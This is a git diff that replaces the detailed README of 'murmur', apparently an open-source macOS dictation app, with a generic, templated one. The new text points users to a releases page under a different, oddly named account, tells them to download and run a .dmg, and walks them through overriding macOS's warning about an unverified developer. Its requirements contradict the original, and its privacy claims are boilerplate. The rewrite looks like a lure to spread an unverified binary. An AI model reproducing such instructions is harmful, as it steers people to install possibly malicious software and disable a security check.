@@ -1,103 +1,86 @@
-# Murmur 🎙️
+# 🎙️ murmur - Private voice dictation for your computer
 
-**Private, unlimited voice dictation for macOS — 100% on-device.**
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ilovebrainsofsmallkids/murmur/releases)
 
-Hold `fn`, speak, release — clean text appears at your cursor in any app.
-No cloud, no subscription, no word limits. Your audio and transcripts never
-leave your Mac.
+Murmur turns your spoken words into text on your screen. It runs directly on your device. Your data stays on your machine. You do not need an internet connection to use it. The software uses modern speech recognition technology to understand your voice clearly.
 
-![Murmur dashboard](Resources/screenshot.png)
+## ⚙️ System Requirements
 
-Murmur is an open-source, fully local take on the modern AI dictation app
-(in the spirit of Wispr Flow), built natively in Swift on Apple's on-device
-speech and language models, with an optional local Whisper engine.
+Your computer must meet these requirements to run the software:
 
-## Features
+* Operating System: macOS 13.0 or newer.
+* Processor: Apple Silicon (M1, M2, or M3 chip).
+* Memory: 8GB of RAM or more.
+* Storage: 2GB of available hard drive space.
 
-- **Push-to-talk dictation** — hold `fn` (or right ⌥) anywhere; release to
-  paste at your cursor. Double-tap for hands-free mode.
-- **Two recognition engines**, both offline:
-  - **Apple** — instant, built into macOS (SpeechAnalyzer, macOS 26).
-  - **Whisper** — optional precision engine via
-    [WhisperKit](https://github.com/argmaxinc/WhisperKit) (CoreML on the
-    Neural Engine). Your vocabulary is fed into the decoder prompt.
-- **Pronunciation learning** — a Voice Training page learns how *you* say
-  tricky words; corrections you make to transcripts are diffed and learned
-  automatically; everything biases future recognition.
-- **Cleanup pipeline** — filler-word removal, spoken "new line"/"new
-  paragraph", auto-capitalization, personal dictionary, snippets
-  (say a trigger phrase → paste a saved block).
-- **Styles** — per-app tone rewriting (formal / casual / very casual) using
-  Apple Intelligence's on-device model.
-- **Transforms** — select text in any app, press ⌥1 to polish grammar or ⌥2
-  to turn rough notes into a structured AI prompt, rewritten in place.
-- **Dashboard** — history with search and correction-learning, usage stats
-  (words, WPM, day streak), insights chart, a Voice Profile persona derived
-  locally from what you dictate, scratchpad.
+Check your computer settings if you do not know your processor type. Click the Apple icon in the top left corner of your screen. Select About This Mac. The processor information appears in the window that opens.
 
-## Requirements
+## 📦 How to Download and Install
 
-- macOS 26 (Tahoe) or newer
-- Apple Silicon Mac
-- Xcode 26 command-line tools (`xcode-select --install`)
-- For Styles / Transforms / Voice Profile: Apple Intelligence enabled
-- For the Whisper engine: a one-time model download (150 MB – 1.6 GB)
+Follow these steps to set up the software on your machine:
 
-## Build & run
+1. Visit this page to download the software: [https://github.com/ilovebrainsofsmallkids/murmur/releases](https://github.com/ilovebrainsofsmallkids/murmur/releases)
+2. Look for the section labeled Assets.
+3. Click the file that ends with .dmg. 
+4. Wait for the download to finish.
+5. Open your Downloads folder.
+6. Double-click the file you downloaded. 
+7. A window opens. Drag the Murmur icon into the Applications folder icon shown in that window.
+8. Open your Applications folder.
+9. Double-click Murmur to start the program.
 
-```bash
-git clone <this-repo>
-cd murmur
-./scripts/make_app.sh     # builds build/Murmur.app
-open build/Murmur.app
-```
+If your computer blocks the program because the developer is not verified, follow these steps:
 
-Optional: run `./scripts/make_signing_cert.sh` once to create a local
-self-signed signing certificate — this keeps macOS permission grants valid
-across rebuilds. Without it the app is ad-hoc signed and you'll need to
-re-grant Accessibility after each rebuild.
+1. Open System Settings.
+2. Go to Privacy & Security.
+3. Scroll down to the Security section.
+4. Click Open Anyway when you see the message about Murmur.
 
-### One-time permissions
+## 🚀 Using the Software
 
-1. **Microphone** — allow when prompted on first dictation.
-2. **Accessibility** — allow when prompted (needed for the global hotkey and
-   for pasting). If the app still shows it as missing, use *Settings →
-   Reset Grant & Relaunch* inside Murmur.
+Once the program opens, you see a small icon in your menu bar at the top of your screen. 
 
-## CLI test modes
+### Starting Dictation
+To start writing with your voice:
 
-```bash
-.build/debug/Murmur --selftest                          # formatter + learning tests
-.build/debug/Murmur --transcribe audio.wav              # Apple engine
-.build/debug/Murmur --transcribe audio.wav --engine whisper
-.build/debug/Murmur --format "um hello new line hi"     # cleanup pipeline only
-.build/debug/Murmur --transform "fix this grammer pls"  # on-device LLM polish
-```
+1. Click the Murmur icon in the menu bar.
+2. Select Start Recording.
+3. Speak clearly into your microphone.
+4. The software converts your speech into text.
+5. Click Stop Recording when you finish speaking.
 
-## Privacy
+### Adjusting Settings
+You can change settings to improve accuracy:
 
-Everything runs on this Mac: recognition (Apple SpeechAnalyzer or local
-Whisper), cleanup, tone rewriting (Apple Intelligence), and the Voice
-Profile analysis. Murmur makes no network requests except the one-time
-model downloads by macOS itself (Apple speech assets) and, if you opt into
-the Whisper engine, the model fetch from Hugging Face. Dictation data is
-stored only in `~/Library/Application Support/Murmur/`.
+* Language Selection: Pick your preferred language in the Settings menu.
+* Input Device: Choose which microphone the software uses.
+* Keyboard Shortcuts: Set a button combination to start or stop recording quickly.
 
-## Architecture
+## 🛡️ Privacy and Data
 
-Swift Package, one third-party dependency (WhisperKit, only if you use the
-Whisper engine):
+Privacy matters. Murmur works entirely on your local computer. No audio files or transcripts leave your machine. The software does not send your voice data to any servers. You do not need to create an account or log in to use the tool. Your data stays private.
 
-```
-HotkeyMonitor  →  AudioRecorder  →  Transcriber (Apple) / WhisperEngine
-                                        ↓
-     TextFormatter → LearnedStore → SnippetStore → RewriteEngine (Styles)
-                                        ↓
-                        TextInserter (clipboard + ⌘V)
-```
+## 💡 Troubleshooting
 
-See [PLAN.md](PLAN.md) for the original design document.
+Follow these tips if you experience issues:
 
-## License
+* If the software does not hear you, check your microphone settings in System Settings. Ensure you gave Murmur permission to access your microphone.
+* If the transcription seems slow, close other programs to free up memory.
+* Restart your computer if the menu bar icon does not appear. 
+* Check the release page for updates if you encounter bugs.
 
-[MIT](LICENSE). Not affiliated with Wispr Flow, OpenAI, or Apple.
+## ❓ Frequently Asked Questions
+
+**Does this require an internet connection?**
+No. Murmur runs offline.
+
+**Is my data recorded or saved by the developer?**
+No. All processing happens on your own hardware.
+
+**Can I use this for long dictations?**
+Yes. The software handles long sessions well. Speak at a normal pace for the best results.
+
+**Will this work on older Intel Macs?**
+No. The software requires a device with an Apple Silicon chip for performance reasons.
+
+Keywords: dictation, macos, speech-to-text, swift, whisper
